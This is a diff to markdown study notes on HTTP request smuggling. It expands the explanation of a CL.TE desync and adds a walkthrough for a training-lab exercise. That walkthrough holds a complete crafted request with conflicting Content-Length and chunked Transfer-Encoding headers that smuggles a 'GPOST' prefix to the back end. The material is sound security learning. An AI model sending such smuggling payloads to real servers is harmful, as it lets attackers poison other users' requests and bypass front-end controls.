@@ -54,7 +54,7 @@ q=smuggling
 
 ### CL.TE Vulnerabilities
 - The frontend server uses the `Content-Length` header and the backend server uses the `Transfer-Encoding` header. Perform a simple HTTP request smuggling attack as follows in the code block below. The frontend processes the `Content-Length` header and determines the request body is 13 bytres long, up to the end of `SMUGGLED`. Request is forwarded to backend server. 
-- Backend server processes the `Transfer-Encoding` header and treats the message body as using chunked encoding. 
+- Backend server processes the `Transfer-Encoding` header and treats the message body as using chunked encoding. It processes the first chunk, stated to be zero length, and so is treated as terminating the request. The following bytes, SMUGGLED, are left unprocessed, and the backend server treats them as the start of the next request in the sequence. 
 
 ```
 POST / HTTP/1.1
@@ -66,3 +66,32 @@ Transfer-Encoding: chunked
 
 SMUGGLED
 ```
+
+#### Lab: HTTP Request Smuggling, Basic CL.TE Vulnerability
+- Involves a frontend and backend, and the frontend does not support chunked encoding. The frontend server rejects requests that aren't using GET or POST method. To solve, smuggle a request to the back-end server so that the next request processed by the backend server appears to use the method `GPOST`. 
+
+```
+POST /post/comment HTTP/1.1
+Host: 0a6a0085043d4777a0b4b6c700920024.web-security-academy.net
+Cookie: session=d4CNLJNIRZeA47ItYi9ktIm1ovuiqVdb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a6a0085043d4777a0b4b6c700920024.web-security-academy.net/post?postId=9
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+X-Pwnfox-Color: yellow
+Priority: u=0, i
+Content-Length: 1
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+![alt text](image.png)
